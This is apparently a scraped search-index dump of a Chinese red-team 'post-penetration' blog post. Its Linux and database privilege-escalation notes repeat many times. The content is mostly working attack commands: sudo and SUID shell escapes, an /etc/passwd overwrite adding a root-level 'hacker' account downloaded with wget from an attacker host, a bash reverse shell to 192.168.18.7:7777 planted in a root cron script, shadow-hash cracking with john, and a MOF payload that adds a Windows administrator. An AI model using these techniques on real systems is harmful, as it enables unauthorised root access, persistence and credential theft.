sudo su - #使用root用户登录，不用输入root密码即可切换 ​ 利用python获取交互Shell python -c 'import pty;pty.spawn(\"/bin/sh\")' sudo su 5.任务计划 ls -l /etc/cron* cat /etc/crontab 在发现有一些计划任务时，我们就可以去检查是否存在一些问题导致权限的提升； 如权限配置不当777的执行脚本，则可以修改脚本内容进行提权； 6.覆盖passwd提权 通过OpenSSL passwd生成一个新的用户hacker，密码为hack123 openssl passwd -1 -salt hacker 123456 $1$hacker$6luIRwdGpBvXdP.GMwcZp/ 将hacker:$1$hacker6luIRwdGpBvXdP.GMwcZp/:0:0:/root:/bin/bash追加到passwd中 将Kali上的passwd文件下载到靶机etc目录下并覆盖原来的passwd文件 wget http://192.168.18.7/passwd -O /etc/passwd 然后在反弹shell中切换用户，或者使用ssh登录都可以 7.ssh密钥提权 cat /etc/passwd | grep bash #查找bash的用户 用MD5校验，authorized_keys id_rsa 为同一个文件 跳转到.ssh目录 将id_rsa下载到本地设置权限 600 登录 假如root存在isa文件 且可以拿到，那么经过以上步骤就能拿到root权限 8.john破解shadow root密文登陆提权john会自动检测密文类型 –wordlist 字段文件 john --wordlist=\"/usr/share/wordlists/rockyou.txt\" userpassw 9.Ubuntu计划任务反弹shell提权 cat /etc/crontab #查看计划任务 crontab -l #查看当前用户的计划任务 ls /var/spool/cron/crontabs/root #root任务文件目录 默认情况下非root权限不可见 tail -f /var/log/syslog 通过syslog 查看日志，发现cleanup.py文件每分钟会以root权限运行一次 发现当前用户可以修改cleanup.py文件 尝试修改计划任务进行反弹shell bash -i \u003e\u0026 /dev/tcp/192.168.18.7/7777 \u003e\u00261 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:2","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#2sudo提权"},{"categories":["hvv"],"content":"\rLinux提权\r1 内核溢出提权 uname -a 查看系统版本和内核信息 使用searchsploit在kali 查找相关内核漏洞 searchsploit -t Ubuntu 14.04 2.sudo提权 sudo --version //查看版本 sudo -l //查看当前用户可以使用的sudo的命令程序 常规提权：（需要当前用户密码，如果管理员在/etc/sudoers配置了某些命令免密码使用，则可以利用该命令进行提权） 利用find: sudo find . -exec /bin/sh \\; -quit或者sudo awk 'BEGIN {system(\"/bin/sh\")}' python命令提权(su root被禁止登录，python获取交互shell) sudo python -c 'import pty;pty.spawn(\"/bin/bash\")' 其他漏洞CVE-2019-14287、CVE-2021-3156 3.suid提权① 查找具有suid权限文件： find / -user root -perm -4000 -print 2\u003e/dev/null find / -perm -u=s -type f 2\u003e/dev/null find / -user root -perm -4000 -exec ls -ldb {} \\; 执行命令： find filename -exec whoami \\; //以SUID即root权限执行命令 如果是/usr/bin/bash执行bash -p //将以root权限打开一个bash shell ② nmap(旧版本的 Nmap（2.02 到 5.21）具有交互模式，允许用户执行 shell 命令) nmap -v //查看版本 root@localhost:~# nmap --interactive //交互模式 nmap\u003e !sh root@localhost:~# whoami root ③ vim Vim 的主要用途是作为文本编辑器。但是，如果它作为 SUID 运行，它将继承 root 用户的权限，因此它可以读取系统上的所有文件。 vim.tiny /etc/shadow //读取文件 vim来打开shell vim.tiny # Press ESC key :set shell=/bin/sh :shell 4.su sudo su - #使用root用户登录，不用输入root密码即可切换 ​ 利用python获取交互Shell python -c 'import pty;pty.spawn(\"/bin/sh\")' sudo su 5.任务计划 ls -l /etc/cron* cat /etc/crontab 在发现有一些计划任务时，我们就可以去检查是否存在一些问题导致权限的提升； 如权限配置不当777的执行脚本，则可以修改脚本内容进行提权； 6.覆盖passwd提权 通过OpenSSL passwd生成一个新的用户hacker，密码为hack123 openssl passwd -1 -salt hacker 123456 $1$hacker$6luIRwdGpBvXdP.GMwcZp/ 将hacker:$1$hacker6luIRwdGpBvXdP.GMwcZp/:0:0:/root:/bin/bash追加到passwd中 将Kali上的passwd文件下载到靶机etc目录下并覆盖原来的passwd文件 wget http://192.168.18.7/passwd -O /etc/passwd 然后在反弹shell中切换用户，或者使用ssh登录都可以 7.ssh密钥提权 cat /etc/passwd | grep bash #查找bash的用户 用MD5校验，authorized_keys id_rsa 为同一个文件 跳转到.ssh目录 将id_rsa下载到本地设置权限 600 登录 假如root存在isa文件 且可以拿到，那么经过以上步骤就能拿到root权限 8.john破解shadow root密文登陆提权john会自动检测密文类型 –wordlist 字段文件 john --wordlist=\"/usr/share/wordlists/rockyou.txt\" userpassw 9.Ubuntu计划任务反弹shell提权 cat /etc/crontab #查看计划任务 crontab -l #查看当前用户的计划任务 ls /var/spool/cron/crontabs/root #root任务文件目录 默认情况下非root权限不可见 tail -f /var/log/syslog 通过syslog 查看日志，发现cleanup.py文件每分钟会以root权限运行一次 发现当前用户可以修改cleanup.py文件 尝试修改计划任务进行反弹shell bash -i \u003e\u0026 /dev/tcp/192.168.18.7/7777 \u003e\u00261 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:2","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#3suid提权"},{"categories":["hvv"],"content":"\rLinux提权\r1 内核溢出提权 uname -a 查看系统版本和内核信息 使用searchsploit在kali 查找相关内核漏洞 searchsploit -t Ubuntu 14.04 2.sudo提权 sudo --version //查看版本 sudo -l //查看当前用户可以使用的sudo的命令程序 常规提权：（需要当前用户密码，如果管理员在/etc/sudoers配置了某些命令免密码使用，则可以利用该命令进行提权） 利用find: sudo find . -exec /bin/sh \\; -quit或者sudo awk 'BEGIN {system(\"/bin/sh\")}' python命令提权(su root被禁止登录，python获取交互shell) sudo python -c 'import pty;pty.spawn(\"/bin/bash\")' 其他漏洞CVE-2019-14287、CVE-2021-3156 3.suid提权① 查找具有suid权限文件： find / -user root -perm -4000 -print 2\u003e/dev/null find / -perm -u=s -type f 2\u003e/dev/null find / -user root -perm -4000 -exec ls -ldb {} \\; 执行命令： find filename -exec whoami \\; //以SUID即root权限执行命令 如果是/usr/bin/bash执行bash -p //将以root权限打开一个bash shell ② nmap(旧版本的 Nmap（2.02 到 5.21）具有交互模式，允许用户执行 shell 命令) nmap -v //查看版本 root@localhost:~# nmap --interactive //交互模式 nmap\u003e !sh root@localhost:~# whoami root ③ vim Vim 的主要用途是作为文本编辑器。但是，如果它作为 SUID 运行，它将继承 root 用户的权限，因此它可以读取系统上的所有文件。 vim.tiny /etc/shadow //读取文件 vim来打开shell vim.tiny # Press ESC key :set shell=/bin/sh :shell 4.su sudo su - #使用root用户登录，不用输入root密码即可切换 ​ 利用python获取交互Shell python -c 'import pty;pty.spawn(\"/bin/sh\")' sudo su 5.任务计划 ls -l /etc/cron* cat /etc/crontab 在发现有一些计划任务时，我们就可以去检查是否存在一些问题导致权限的提升； 如权限配置不当777的执行脚本，则可以修改脚本内容进行提权； 6.覆盖passwd提权 通过OpenSSL passwd生成一个新的用户hacker，密码为hack123 openssl passwd -1 -salt hacker 123456 $1$hacker$6luIRwdGpBvXdP.GMwcZp/ 将hacker:$1$hacker6luIRwdGpBvXdP.GMwcZp/:0:0:/root:/bin/bash追加到passwd中 将Kali上的passwd文件下载到靶机etc目录下并覆盖原来的passwd文件 wget http://192.168.18.7/passwd -O /etc/passwd 然后在反弹shell中切换用户，或者使用ssh登录都可以 7.ssh密钥提权 cat /etc/passwd | grep bash #查找bash的用户 用MD5校验，authorized_keys id_rsa 为同一个文件 跳转到.ssh目录 将id_rsa下载到本地设置权限 600 登录 假如root存在isa文件 且可以拿到，那么经过以上步骤就能拿到root权限 8.john破解shadow root密文登陆提权john会自动检测密文类型 –wordlist 字段文件 john --wordlist=\"/usr/share/wordlists/rockyou.txt\" userpassw 9.Ubuntu计划任务反弹shell提权 cat /etc/crontab #查看计划任务 crontab -l #查看当前用户的计划任务 ls /var/spool/cron/crontabs/root #root任务文件目录 默认情况下非root权限不可见 tail -f /var/log/syslog 通过syslog 查看日志，发现cleanup.py文件每分钟会以root权限运行一次 发现当前用户可以修改cleanup.py文件 尝试修改计划任务进行反弹shell bash -i \u003e\u0026 /dev/tcp/192.168.18.7/7777 \u003e\u00261 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:2","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#4su"},{"categories":["hvv"],"content":"\rLinux提权\r1 内核溢出提权 uname -a 查看系统版本和内核信息 使用searchsploit在kali 查找相关内核漏洞 searchsploit -t Ubuntu 14.04 2.sudo提权 sudo --version //查看版本 sudo -l //查看当前用户可以使用的sudo的命令程序 常规提权：（需要当前用户密码，如果管理员在/etc/sudoers配置了某些命令免密码使用，则可以利用该命令进行提权） 利用find: sudo find . -exec /bin/sh \\; -quit或者sudo awk 'BEGIN {system(\"/bin/sh\")}' python命令提权(su root被禁止登录，python获取交互shell) sudo python -c 'import pty;pty.spawn(\"/bin/bash\")' 其他漏洞CVE-2019-14287、CVE-2021-3156 3.suid提权① 查找具有suid权限文件： find / -user root -perm -4000 -print 2\u003e/dev/null find / -perm -u=s -type f 2\u003e/dev/null find / -user root -perm -4000 -exec ls -ldb {} \\; 执行命令： find filename -exec whoami \\; //以SUID即root权限执行命令 如果是/usr/bin/bash执行bash -p //将以root权限打开一个bash shell ② nmap(旧版本的 Nmap（2.02 到 5.21）具有交互模式，允许用户执行 shell 命令) nmap -v //查看版本 root@localhost:~# nmap --interactive //交互模式 nmap\u003e !sh root@localhost:~# whoami root ③ vim Vim 的主要用途是作为文本编辑器。但是，如果它作为 SUID 运行，它将继承 root 用户的权限，因此它可以读取系统上的所有文件。 vim.tiny /etc/shadow //读取文件 vim来打开shell vim.tiny # Press ESC key :set shell=/bin/sh :shell 4.su sudo su - #使用root用户登录，不用输入root密码即可切换 ​ 利用python获取交互Shell python -c 'import pty;pty.spawn(\"/bin/sh\")' sudo su 5.任务计划 ls -l /etc/cron* cat /etc/crontab 在发现有一些计划任务时，我们就可以去检查是否存在一些问题导致权限的提升； 如权限配置不当777的执行脚本，则可以修改脚本内容进行提权； 6.覆盖passwd提权 通过OpenSSL passwd生成一个新的用户hacker，密码为hack123 openssl passwd -1 -salt hacker 123456 $1$hacker$6luIRwdGpBvXdP.GMwcZp/ 将hacker:$1$hacker6luIRwdGpBvXdP.GMwcZp/:0:0:/root:/bin/bash追加到passwd中 将Kali上的passwd文件下载到靶机etc目录下并覆盖原来的passwd文件 wget http://192.168.18.7/passwd -O /etc/passwd 然后在反弹shell中切换用户，或者使用ssh登录都可以 7.ssh密钥提权 cat /etc/passwd | grep bash #查找bash的用户 用MD5校验，authorized_keys id_rsa 为同一个文件 跳转到.ssh目录 将id_rsa下载到本地设置权限 600 登录 假如root存在isa文件 且可以拿到，那么经过以上步骤就能拿到root权限 8.john破解shadow root密文登陆提权john会自动检测密文类型 –wordlist 字段文件 john --wordlist=\"/usr/share/wordlists/rockyou.txt\" userpassw 9.Ubuntu计划任务反弹shell提权 cat /etc/crontab #查看计划任务 crontab -l #查看当前用户的计划任务 ls /var/spool/cron/crontabs/root #root任务文件目录 默认情况下非root权限不可见 tail -f /var/log/syslog 通过syslog 查看日志，发现cleanup.py文件每分钟会以root权限运行一次 发现当前用户可以修改cleanup.py文件 尝试修改计划任务进行反弹shell bash -i \u003e\u0026 /dev/tcp/192.168.18.7/7777 \u003e\u00261 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:2","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#5任务计划"},{"categories":["hvv"],"content":"\rLinux提权\r1 内核溢出提权 uname -a 查看系统版本和内核信息 使用searchsploit在kali 查找相关内核漏洞 searchsploit -t Ubuntu 14.04 2.sudo提权 sudo --version //查看版本 sudo -l //查看当前用户可以使用的sudo的命令程序 常规提权：（需要当前用户密码，如果管理员在/etc/sudoers配置了某些命令免密码使用，则可以利用该命令进行提权） 利用find: sudo find . -exec /bin/sh \\; -quit或者sudo awk 'BEGIN {system(\"/bin/sh\")}' python命令提权(su root被禁止登录，python获取交互shell) sudo python -c 'import pty;pty.spawn(\"/bin/bash\")' 其他漏洞CVE-2019-14287、CVE-2021-3156 3.suid提权① 查找具有suid权限文件： find / -user root -perm -4000 -print 2\u003e/dev/null find / -perm -u=s -type f 2\u003e/dev/null find / -user root -perm -4000 -exec ls -ldb {} \\; 执行命令： find filename -exec whoami \\; //以SUID即root权限执行命令 如果是/usr/bin/bash执行bash -p //将以root权限打开一个bash shell ② nmap(旧版本的 Nmap（2.02 到 5.21）具有交互模式，允许用户执行 shell 命令) nmap -v //查看版本 root@localhost:~# nmap --interactive //交互模式 nmap\u003e !sh root@localhost:~# whoami root ③ vim Vim 的主要用途是作为文本编辑器。但是，如果它作为 SUID 运行，它将继承 root 用户的权限，因此它可以读取系统上的所有文件。 vim.tiny /etc/shadow //读取文件 vim来打开shell vim.tiny # Press ESC key :set shell=/bin/sh :shell 4.su sudo su - #使用root用户登录，不用输入root密码即可切换 ​ 利用python获取交互Shell python -c 'import pty;pty.spawn(\"/bin/sh\")' sudo su 5.任务计划 ls -l /etc/cron* cat /etc/crontab 在发现有一些计划任务时，我们就可以去检查是否存在一些问题导致权限的提升； 如权限配置不当777的执行脚本，则可以修改脚本内容进行提权； 6.覆盖passwd提权 通过OpenSSL passwd生成一个新的用户hacker，密码为hack123 openssl passwd -1 -salt hacker 123456 $1$hacker$6luIRwdGpBvXdP.GMwcZp/ 将hacker:$1$hacker6luIRwdGpBvXdP.GMwcZp/:0:0:/root:/bin/bash追加到passwd中 将Kali上的passwd文件下载到靶机etc目录下并覆盖原来的passwd文件 wget http://192.168.18.7/passwd -O /etc/passwd 然后在反弹shell中切换用户，或者使用ssh登录都可以 7.ssh密钥提权 cat /etc/passwd | grep bash #查找bash的用户 用MD5校验，authorized_keys id_rsa 为同一个文件 跳转到.ssh目录 将id_rsa下载到本地设置权限 600 登录 假如root存在isa文件 且可以拿到，那么经过以上步骤就能拿到root权限 8.john破解shadow root密文登陆提权john会自动检测密文类型 –wordlist 字段文件 john --wordlist=\"/usr/share/wordlists/rockyou.txt\" userpassw 9.Ubuntu计划任务反弹shell提权 cat /etc/crontab #查看计划任务 crontab -l #查看当前用户的计划任务 ls /var/spool/cron/crontabs/root #root任务文件目录 默认情况下非root权限不可见 tail -f /var/log/syslog 通过syslog 查看日志，发现cleanup.py文件每分钟会以root权限运行一次 发现当前用户可以修改cleanup.py文件 尝试修改计划任务进行反弹shell bash -i \u003e\u0026 /dev/tcp/192.168.18.7/7777 \u003e\u00261 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:2","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#6覆盖passwd提权"},{"categories":["hvv"],"content":"\rLinux提权\r1 内核溢出提权 uname -a 查看系统版本和内核信息 使用searchsploit在kali 查找相关内核漏洞 searchsploit -t Ubuntu 14.04 2.sudo提权 sudo --version //查看版本 sudo -l //查看当前用户可以使用的sudo的命令程序 常规提权：（需要当前用户密码，如果管理员在/etc/sudoers配置了某些命令免密码使用，则可以利用该命令进行提权） 利用find: sudo find . -exec /bin/sh \\; -quit或者sudo awk 'BEGIN {system(\"/bin/sh\")}' python命令提权(su root被禁止登录，python获取交互shell) sudo python -c 'import pty;pty.spawn(\"/bin/bash\")' 其他漏洞CVE-2019-14287、CVE-2021-3156 3.suid提权① 查找具有suid权限文件： find / -user root -perm -4000 -print 2\u003e/dev/null find / -perm -u=s -type f 2\u003e/dev/null find / -user root -perm -4000 -exec ls -ldb {} \\; 执行命令： find filename -exec whoami \\; //以SUID即root权限执行命令 如果是/usr/bin/bash执行bash -p //将以root权限打开一个bash shell ② nmap(旧版本的 Nmap（2.02 到 5.21）具有交互模式，允许用户执行 shell 命令) nmap -v //查看版本 root@localhost:~# nmap --interactive //交互模式 nmap\u003e !sh root@localhost:~# whoami root ③ vim Vim 的主要用途是作为文本编辑器。但是，如果它作为 SUID 运行，它将继承 root 用户的权限，因此它可以读取系统上的所有文件。 vim.tiny /etc/shadow //读取文件 vim来打开shell vim.tiny # Press ESC key :set shell=/bin/sh :shell 4.su sudo su - #使用root用户登录，不用输入root密码即可切换 ​ 利用python获取交互Shell python -c 'import pty;pty.spawn(\"/bin/sh\")' sudo su 5.任务计划 ls -l /etc/cron* cat /etc/crontab 在发现有一些计划任务时，我们就可以去检查是否存在一些问题导致权限的提升； 如权限配置不当777的执行脚本，则可以修改脚本内容进行提权； 6.覆盖passwd提权 通过OpenSSL passwd生成一个新的用户hacker，密码为hack123 openssl passwd -1 -salt hacker 123456 $1$hacker$6luIRwdGpBvXdP.GMwcZp/ 将hacker:$1$hacker6luIRwdGpBvXdP.GMwcZp/:0:0:/root:/bin/bash追加到passwd中 将Kali上的passwd文件下载到靶机etc目录下并覆盖原来的passwd文件 wget http://192.168.18.7/passwd -O /etc/passwd 然后在反弹shell中切换用户，或者使用ssh登录都可以 7.ssh密钥提权 cat /etc/passwd | grep bash #查找bash的用户 用MD5校验，authorized_keys id_rsa 为同一个文件 跳转到.ssh目录 将id_rsa下载到本地设置权限 600 登录 假如root存在isa文件 且可以拿到，那么经过以上步骤就能拿到root权限 8.john破解shadow root密文登陆提权john会自动检测密文类型 –wordlist 字段文件 john --wordlist=\"/usr/share/wordlists/rockyou.txt\" userpassw 9.Ubuntu计划任务反弹shell提权 cat /etc/crontab #查看计划任务 crontab -l #查看当前用户的计划任务 ls /var/spool/cron/crontabs/root #root任务文件目录 默认情况下非root权限不可见 tail -f /var/log/syslog 通过syslog 查看日志，发现cleanup.py文件每分钟会以root权限运行一次 发现当前用户可以修改cleanup.py文件 尝试修改计划任务进行反弹shell bash -i \u003e\u0026 /dev/tcp/192.168.18.7/7777 \u003e\u00261 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:2","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#7ssh密钥提权"},{"categories":["hvv"],"content":"\rLinux提权\r1 内核溢出提权 uname -a 查看系统版本和内核信息 使用searchsploit在kali 查找相关内核漏洞 searchsploit -t Ubuntu 14.04 2.sudo提权 sudo --version //查看版本 sudo -l //查看当前用户可以使用的sudo的命令程序 常规提权：（需要当前用户密码，如果管理员在/etc/sudoers配置了某些命令免密码使用，则可以利用该命令进行提权） 利用find: sudo find . -exec /bin/sh \\; -quit或者sudo awk 'BEGIN {system(\"/bin/sh\")}' python命令提权(su root被禁止登录，python获取交互shell) sudo python -c 'import pty;pty.spawn(\"/bin/bash\")' 其他漏洞CVE-2019-14287、CVE-2021-3156 3.suid提权① 查找具有suid权限文件： find / -user root -perm -4000 -print 2\u003e/dev/null find / -perm -u=s -type f 2\u003e/dev/null find / -user root -perm -4000 -exec ls -ldb {} \\; 执行命令： find filename -exec whoami \\; //以SUID即root权限执行命令 如果是/usr/bin/bash执行bash -p //将以root权限打开一个bash shell ② nmap(旧版本的 Nmap（2.02 到 5.21）具有交互模式，允许用户执行 shell 命令) nmap -v //查看版本 root@localhost:~# nmap --interactive //交互模式 nmap\u003e !sh root@localhost:~# whoami root ③ vim Vim 的主要用途是作为文本编辑器。但是，如果它作为 SUID 运行，它将继承 root 用户的权限，因此它可以读取系统上的所有文件。 vim.tiny /etc/shadow //读取文件 vim来打开shell vim.tiny # Press ESC key :set shell=/bin/sh :shell 4.su sudo su - #使用root用户登录，不用输入root密码即可切换 ​ 利用python获取交互Shell python -c 'import pty;pty.spawn(\"/bin/sh\")' sudo su 5.任务计划 ls -l /etc/cron* cat /etc/crontab 在发现有一些计划任务时，我们就可以去检查是否存在一些问题导致权限的提升； 如权限配置不当777的执行脚本，则可以修改脚本内容进行提权； 6.覆盖passwd提权 通过OpenSSL passwd生成一个新的用户hacker，密码为hack123 openssl passwd -1 -salt hacker 123456 $1$hacker$6luIRwdGpBvXdP.GMwcZp/ 将hacker:$1$hacker6luIRwdGpBvXdP.GMwcZp/:0:0:/root:/bin/bash追加到passwd中 将Kali上的passwd文件下载到靶机etc目录下并覆盖原来的passwd文件 wget http://192.168.18.7/passwd -O /etc/passwd 然后在反弹shell中切换用户，或者使用ssh登录都可以 7.ssh密钥提权 cat /etc/passwd | grep bash #查找bash的用户 用MD5校验，authorized_keys id_rsa 为同一个文件 跳转到.ssh目录 将id_rsa下载到本地设置权限 600 登录 假如root存在isa文件 且可以拿到，那么经过以上步骤就能拿到root权限 8.john破解shadow root密文登陆提权john会自动检测密文类型 –wordlist 字段文件 john --wordlist=\"/usr/share/wordlists/rockyou.txt\" userpassw 9.Ubuntu计划任务反弹shell提权 cat /etc/crontab #查看计划任务 crontab -l #查看当前用户的计划任务 ls /var/spool/cron/crontabs/root #root任务文件目录 默认情况下非root权限不可见 tail -f /var/log/syslog 通过syslog 查看日志，发现cleanup.py文件每分钟会以root权限运行一次 发现当前用户可以修改cleanup.py文件 尝试修改计划任务进行反弹shell bash -i \u003e\u0026 /dev/tcp/192.168.18.7/7777 \u003e\u00261 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:2","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#8john破解shadow-root密文登陆提权"},{"categories":["hvv"],"content":"\rLinux提权\r1 内核溢出提权 uname -a 查看系统版本和内核信息 使用searchsploit在kali 查找相关内核漏洞 searchsploit -t Ubuntu 14.04 2.sudo提权 sudo --version //查看版本 sudo -l //查看当前用户可以使用的sudo的命令程序 常规提权：（需要当前用户密码，如果管理员在/etc/sudoers配置了某些命令免密码使用，则可以利用该命令进行提权） 利用find: sudo find . -exec /bin/sh \\; -quit或者sudo awk 'BEGIN {system(\"/bin/sh\")}' python命令提权(su root被禁止登录，python获取交互shell) sudo python -c 'import pty;pty.spawn(\"/bin/bash\")' 其他漏洞CVE-2019-14287、CVE-2021-3156 3.suid提权① 查找具有suid权限文件： find / -user root -perm -4000 -print 2\u003e/dev/null find / -perm -u=s -type f 2\u003e/dev/null find / -user root -perm -4000 -exec ls -ldb {} \\; 执行命令： find filename -exec whoami \\; //以SUID即root权限执行命令 如果是/usr/bin/bash执行bash -p //将以root权限打开一个bash shell ② nmap(旧版本的 Nmap（2.02 到 5.21）具有交互模式，允许用户执行 shell 命令) nmap -v //查看版本 root@localhost:~# nmap --interactive //交互模式 nmap\u003e !sh root@localhost:~# whoami root ③ vim Vim 的主要用途是作为文本编辑器。但是，如果它作为 SUID 运行，它将继承 root 用户的权限，因此它可以读取系统上的所有文件。 vim.tiny /etc/shadow //读取文件 vim来打开shell vim.tiny # Press ESC key :set shell=/bin/sh :shell 4.su sudo su - #使用root用户登录，不用输入root密码即可切换 ​ 利用python获取交互Shell python -c 'import pty;pty.spawn(\"/bin/sh\")' sudo su 5.任务计划 ls -l /etc/cron* cat /etc/crontab 在发现有一些计划任务时，我们就可以去检查是否存在一些问题导致权限的提升； 如权限配置不当777的执行脚本，则可以修改脚本内容进行提权； 6.覆盖passwd提权 通过OpenSSL passwd生成一个新的用户hacker，密码为hack123 openssl passwd -1 -salt hacker 123456 $1$hacker$6luIRwdGpBvXdP.GMwcZp/ 将hacker:$1$hacker6luIRwdGpBvXdP.GMwcZp/:0:0:/root:/bin/bash追加到passwd中 将Kali上的passwd文件下载到靶机etc目录下并覆盖原来的passwd文件 wget http://192.168.18.7/passwd -O /etc/passwd 然后在反弹shell中切换用户，或者使用ssh登录都可以 7.ssh密钥提权 cat /etc/passwd | grep bash #查找bash的用户 用MD5校验，authorized_keys id_rsa 为同一个文件 跳转到.ssh目录 将id_rsa下载到本地设置权限 600 登录 假如root存在isa文件 且可以拿到，那么经过以上步骤就能拿到root权限 8.john破解shadow root密文登陆提权john会自动检测密文类型 –wordlist 字段文件 john --wordlist=\"/usr/share/wordlists/rockyou.txt\" userpassw 9.Ubuntu计划任务反弹shell提权 cat /etc/crontab #查看计划任务 crontab -l #查看当前用户的计划任务 ls /var/spool/cron/crontabs/root #root任务文件目录 默认情况下非root权限不可见 tail -f /var/log/syslog 通过syslog 查看日志，发现cleanup.py文件每分钟会以root权限运行一次 发现当前用户可以修改cleanup.py文件 尝试修改计划任务进行反弹shell bash -i \u003e\u0026 /dev/tcp/192.168.18.7/7777 \u003e\u00261 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:2","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#9ubuntu计划任务反弹shell提权"},{"categories":["hvv"],"content":"\r数据库提权\r1.MOF提权MySQL数据库，Windows\u003c=2003 MOF文件既然每五秒就会执行，而且是系统权限； 我们通过mysql将文件写入一个MOF文件替换掉原有的MOF文件； 然后系统每隔五秒就会执行一次我们上传的MOF。 MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权： #pragma namespace(\"\\\\\\\\.\\\\root\\\\subscription\") instance of __EventFilter as $EventFilter { EventNamespace = \"Root\\\\Cimv2\"; Name = \"filtP2\"; Query = \"Select * From __InstanceModificationEvent \" \"Where TargetInstance Isa \\\"Win32_LocalTime\\\" \" \"And TargetInstance.Second = 5\"; QueryLanguage = \"WQL\"; }; instance of ActiveScriptEventConsumer as $Consumer { Name = \"consPCSV2\"; ScriptingEngine = \"JScript\"; ScriptText = \"var WSH = new ActiveXObject(\\\"WScript.Shell\\\")\\nWSH.run(\\\"net.exe user hacker P@ssw0rd /add\\\")\\nWSH.run(\\\"net.exe localgroup administrators hacker /add\\\")\"; }; instance of __FilterToConsumerBinding { Consumer = $Consumer; Filter = $EventFilter; }; （通常使用msf自带的mof模块来实现提权） 2.UDF提权UDF是mysql的一个拓展接口，UDF（Userdefined function）可翻译为用户自定义函数，这个是用来拓展Mysql的技术手段。当我们有读取和写入权限以后，我们就可以尝试使用UDF提权的方法，从数据库的root权限提升到系统的管理员权限 https://blog.csdn.net/qq_43430261/article/details/107258466 3.Mssql提权mssql提权主要分为弱口令与溢出两类提权。目前主要通过弱口令连接直接提权，溢出类Mssql数据库几乎很少见（sqlserver2000之后就几乎没有了）。 通过漏洞拉到webshell之后，找到网站配置文件，里面有sa权限的账号密码，配置文件为asp或者aspx网站一般使用微软自带数据库，这个提权没有sa权限是不能做的 mssql一般是允许远程连接的 系统库是master ","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:3","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#数据库提权"},{"categories":["hvv"],"content":"\r数据库提权\r1.MOF提权MySQL数据库，Windows\u003c=2003 MOF文件既然每五秒就会执行，而且是系统权限； 我们通过mysql将文件写入一个MOF文件替换掉原有的MOF文件； 然后系统每隔五秒就会执行一次我们上传的MOF。 MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权： #pragma namespace(\"\\\\\\\\.\\\\root\\\\subscription\") instance of __EventFilter as $EventFilter { EventNamespace = \"Root\\\\Cimv2\"; Name = \"filtP2\"; Query = \"Select * From __InstanceModificationEvent \" \"Where TargetInstance Isa \\\"Win32_LocalTime\\\" \" \"And TargetInstance.Second = 5\"; QueryLanguage = \"WQL\"; }; instance of ActiveScriptEventConsumer as $Consumer { Name = \"consPCSV2\"; ScriptingEngine = \"JScript\"; ScriptText = \"var WSH = new ActiveXObject(\\\"WScript.Shell\\\")\\nWSH.run(\\\"net.exe user hacker P@ssw0rd /add\\\")\\nWSH.run(\\\"net.exe localgroup administrators hacker /add\\\")\"; }; instance of __FilterToConsumerBinding { Consumer = $Consumer; Filter = $EventFilter; }; （通常使用msf自带的mof模块来实现提权） 2.UDF提权UDF是mysql的一个拓展接口，UDF（Userdefined function）可翻译为用户自定义函数，这个是用来拓展Mysql的技术手段。当我们有读取和写入权限以后，我们就可以尝试使用UDF提权的方法，从数据库的root权限提升到系统的管理员权限 https://blog.csdn.net/qq_43430261/article/details/107258466 3.Mssql提权mssql提权主要分为弱口令与溢出两类提权。目前主要通过弱口令连接直接提权，溢出类Mssql数据库几乎很少见（sqlserver2000之后就几乎没有了）。 通过漏洞拉到webshell之后，找到网站配置文件，里面有sa权限的账号密码，配置文件为asp或者aspx网站一般使用微软自带数据库，这个提权没有sa权限是不能做的 mssql一般是允许远程连接的 系统库是master ","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:3","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#1mof提权"},{"categories":["hvv"],"content":"\r数据库提权\r1.MOF提权MySQL数据库，Windows\u003c=2003 MOF文件既然每五秒就会执行，而且是系统权限； 我们通过mysql将文件写入一个MOF文件替换掉原有的MOF文件； 然后系统每隔五秒就会执行一次我们上传的MOF。 MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权： #pragma namespace(\"\\\\\\\\.\\\\root\\\\subscription\") instance of __EventFilter as $EventFilter { EventNamespace = \"Root\\\\Cimv2\"; Name = \"filtP2\"; Query = \"Select * From __InstanceModificationEvent \" \"Where TargetInstance Isa \\\"Win32_LocalTime\\\" \" \"And TargetInstance.Second = 5\"; QueryLanguage = \"WQL\"; }; instance of ActiveScriptEventConsumer as $Consumer { Name = \"consPCSV2\"; ScriptingEngine = \"JScript\"; ScriptText = \"var WSH = new ActiveXObject(\\\"WScript.Shell\\\")\\nWSH.run(\\\"net.exe user hacker P@ssw0rd /add\\\")\\nWSH.run(\\\"net.exe localgroup administrators hacker /add\\\")\"; }; instance of __FilterToConsumerBinding { Consumer = $Consumer; Filter = $EventFilter; }; （通常使用msf自带的mof模块来实现提权） 2.UDF提权UDF是mysql的一个拓展接口，UDF（Userdefined function）可翻译为用户自定义函数，这个是用来拓展Mysql的技术手段。当我们有读取和写入权限以后，我们就可以尝试使用UDF提权的方法，从数据库的root权限提升到系统的管理员权限 https://blog.csdn.net/qq_43430261/article/details/107258466 3.Mssql提权mssql提权主要分为弱口令与溢出两类提权。目前主要通过弱口令连接直接提权，溢出类Mssql数据库几乎很少见（sqlserver2000之后就几乎没有了）。 